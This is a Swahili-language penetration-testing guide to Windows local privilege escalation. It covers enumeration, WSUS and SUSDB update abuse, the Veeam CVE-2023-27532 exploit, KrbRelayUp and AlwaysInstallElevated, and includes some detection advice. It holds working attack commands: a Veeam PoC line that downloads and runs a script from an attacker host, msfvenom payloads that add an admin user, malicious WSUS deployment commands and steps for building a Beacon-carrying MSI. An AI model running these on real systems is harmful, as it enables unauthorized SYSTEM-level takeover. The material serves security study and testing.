# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Tool bora zaidi ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na checklist za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa offline wa UEFI NVRAM kuwa mnyororo wa mashambulizi unaotumia DMA kabla ya boot na kubadilisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maonyo, pale ukaguzi wa secure-path wa AppInfo unapokwepwa. Angalia mtiririko maalum wa kukwepa UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry wa accessibility wa Secure Desktop unaweza kutumiwa vibaya kufanya uandishi wowote wa SYSTEM registry (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Build za hivi karibuni za Windows pia zilianzisha njia ya **SMB arbitrary-port** LPE, ambapo uthibitishaji wa NTLM wa ndani wenye privilege huakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina vulnerability yoyote inayojulikana (pia kagua patches zilizowekwa).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotolewa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu build ya OS, updates zilizosakinishwa, na matoleo ya advisory yanayoweza kuhusika; hakikisha bidhaa husika na updates zilizochukua nafasi ya nyingine kabla ya kuchukulia matokeo kuwa yanatumika.

Kwa exploit ya ndani inayohusu toleo mahususi, kagua **usanifu wa process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya biti 64, process ya biti 32 huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya biti 32, ilhali `%windir%\Sysnative` huipa process hiyo ufikiaji wa saraka ya mfumo asilia. Alias hii haipatikani kwa process ya biti 64. Build ya OS au hitimisho kwamba KB fulani haipo havithibitishi kuwa mfumo unaweza kushambuliwa; linganisha build inayoendeshwa, update iliyosakinishwa au iliyochukua nafasi ya nyingine, usanifu wa process, na masharti ya exploit na [bulletin ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za exploits kwenye Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info yoyote iliyohifadhiwa kwenye vigeu vya mazingira?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za Transcript za PowerShell

Unaweza kujifunza jinsi ya kuwasha kipengele hiki hapa: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili katika folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Kagua njia halisi ya hifadhi na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na matokeo, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua utambulisho wa kiwango cha juu zaidi unaoweza kutumika na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline huhifadhiwa, yakijumuisha amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasirekodiwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kutazama matukio 15 ya mwisho kutoka kwenye logs za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, na kuhakikisha kuwa kila sehemu ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi rekodi pana ya ukaguzi wa kila shughuli, yenye manufaa kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, hupatikana maarifa ya kina kuhusu mchakato.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer kupitia njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya WSUS ya HTTP ni kidokezo cha kuchunguza uwezekano wa kukatiza metadata za updates. Exploitation pia hutegemea kama client hutumia server hiyo ya WSUS, kama mshambuliaji anaweza kukatiza au kudhibiti traffic yake, na sera za client za kuamini na kusakinisha updates. URL pekee haithibitishi utekelezaji wa code. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Anza kwa kuangalia kama mtandao unatumia update ya WSUS isiyo na SSL kwa kutekeleza amri ifuatayo katika cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya HTTP interception, lakini haithibitishi kuwa interception, kukubaliwa kwa update hasidi, au usakinishaji wenye ruhusa za juu unawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haitumiki na sera hiyo.

Ili kutumia vulnerabilities hizi, unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM weaponized exploits za kuingiza updates 'bandia' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari linalotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates ikatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kompyuta yetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia hutumia certificate store yake. Tukitengeneza certificate ya self-signed kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo inayofanana na HSTS kutekeleza uthibitishaji wa trust-on-first-use wa certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, huduma itaikubali.

Unaweza kutumia vulnerability hii kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (itakapopatikana).

### Updates za WSUS zinazodhibitiwa na msimamizi

Njia tofauti ipo pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** updates kwenye seva ya WSUS. Kagua uanachama unaotumika wa kikundi cha `WSUS Administrators` cha seva na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kikundi cha kompyuta za wateja ambacho kitapokea update iliyoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini iliyotumika kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kuwa update inayochunguzwa imesainiwa na kukubaliwa, inatumika kwa lengo, na imesakinishwa katika muktadha wenye ruhusa za juu kabla ya kuichukulia kuwa njia ya kuongeza ruhusa. Thamani ya HTTP `WUServer` au jina la kikundi pekee halithibitishi masharti hayo.

### Matumizi mabaya ya SUSDB custom-update: payloads zisizosainiwa kupitia `.txt`/`.esd`

Hili ni tatizo tofauti la mpaka wa uaminifu na kuingilia muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha update maalum. Njia moja ya kuingia ni kuelekeza upya akaunti ya kompyuta ya WSUS ya juu kwenda kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa una haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayodireksheni upya uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Tengeneza, lenga na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia taratibu halali za WSUS kama API yenye vizuizi ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya masharti ya awali, vya lugha maalum na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/tengeneza kikundi cha kompyuta na uongeze mteja | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kikundi hicho | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na kikundi lengwa, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, kikundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass ya saini inayotegemea extension

WSUS kwa kawaida hukataa maudhui ya executable yasiyo na saini. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa certificate kuwa false jina la faili lililotolewa linapoishia na `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba bytes hizo ni maandishi au image halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji wa command-line ya update. Hii ni hitilafu ya policy/type-confusion, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Uwekaji na uendeshaji otomatiki unaoendana na BITS

Kuita `spDeployUpdate` hufanya WSUS ipakue maudhui yaliyosajiliwa. Chanzo lazima kitimize matarajio ya HTTP ya BITS: URL inayoweza kufikiwa pekee haitoshi, kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyounga mkono Range husababisha WSUS kutoa tukio la ulandanishi `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha itifaki cha Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na inasambazwa pamoja na `BitsWebServer.py` kwa uwekaji wa maudhui. Mfano mdogo wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence ya majaribio tena

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, hufanya sasisho lililoidhinishwa lipakuliwe na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kulichagua mwenyewe. Katika majaribio, payload ambayo sasisho lake lilibaki limefeli/halijakamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hivyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji inayojirudia; ina kelele kwa sababu mteja huonyesha hali ya sasisho lililofeli.<sup>[[39]](#references)</sup>

#### Njia za kutambua na kuimarisha usalama

Njia muhimu za uchunguzi upande wa server na wa mteja katika mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza makundi mapya ya kulenga, vyanzo vya maudhui vya nje, payload za sasisho za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa kimakosa, na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload na magic ya maudhui badala ya kutegemea kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaofeli/kujaribu tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapowezekana, hitaji Extended Protection for Authentication kwenye huduma ya database, na zuia ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya kiutawala iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Visasishaji vya Wahusika Wengine na Agent IPC (local privesc)

Agents wengi wa enterprise hutoa IPC ya localhost na channel ya kusasisha yenye privileges za juu. Ikiwa enrollment inaweza kulazimishwa kuwasiliana na server ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM itasakinisha. Tazama technique ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za database ya usanidi ndani ya mipaka ya mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huduma inaweza kusikiliza zaidi ya localhost, kwa hivyo kagua anwani yake halisi na PID.

- **Uchunguzi**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathiriwa. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi isiyowekewa patch na patch ya baadaye kwenye nambari hizo hizo za build. Thibitisha kitambulisho cha patch kwa kutumia [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na DLL zinazohitajika za Veeam kwenye saraka hiyo hiyo, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyotajwa inaonyesha utekelezaji wa command kama SYSTEM ikiwa mahitaji yake ya ziada yametimizwa; advisory ya vendor inaeleza suala la kufichuka kwa credentials.
## KrbRelayUp

Kerberos relay ya ndani inaweza kuvuka kutoka logon yenye privilege ndogo hadi uandishi wa directory wenye privilege za juu, pale COM server inayofaa inapofanya authentication na principal iliyorileyiwa ikiwa na haki kwenye object lengwa. [Nyaraka za KrbRelay](https://github.com/cube0x0/KrbRelay) zinaeleza uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Msururu wa RBCD unahitaji delegation inayotumika na haki kwenye object lengwa, huku msururu wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi za DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorileyiwa, na viwango vya authentication na impersonation vya darasa la COM lililochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: session ya WinRM inaweza kufanya kazi tofauti na logon ya interactive au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa zinaweza pia kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kuwa mambo yanayofaa kukaguliwa; enumeration isiyoingilia mfumo haipaswi kusababisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina haki zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** rejista hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wenye privilege ya aina yoyote wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kufanya technique hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya directory ya sasa binary ya Windows MSI ya kuongeza privileges. Script hii huandika installer ya MSI iliyokompailiwa awali, ambayo huomba kuongeza user/group (kwa hiyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza priviliji.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Unda MSI kwa WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Unda MSI kwa Visual Studio

- **Tengeneza** kwa Cobalt Strike au Metasploit **payload mpya ya Windows EXE TCP** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafuta. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha bofya **Finish**.
- Angazia mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna sifa nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa payload ya Beacon inatekelezwa mara tu kisakinishi kinapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka jukwaa kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachoandikwa kwenye **kumbukumbu**, kwa hivyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

